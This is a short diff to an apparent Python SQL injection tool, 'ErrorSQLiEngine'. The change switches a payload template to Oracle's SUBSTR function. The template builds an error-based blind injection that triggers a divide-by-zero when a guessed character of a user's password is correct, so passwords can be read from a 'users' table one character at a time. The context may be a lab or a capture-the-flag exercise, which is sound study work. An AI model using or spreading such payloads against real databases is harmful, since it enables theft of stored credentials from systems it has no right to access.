@@ -36,7 +36,7 @@ class ErrorSQLiEngine:
         return (
             f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) "
             f"ELSE '' END from users where username='{user}' "
-            f"and substring(password,{position},1)='{char}') || '"
+            f"and SUBSTR(password,{position},1)='{char}') || '"
         )
 
     def _build_length_payload(self, user, mid):
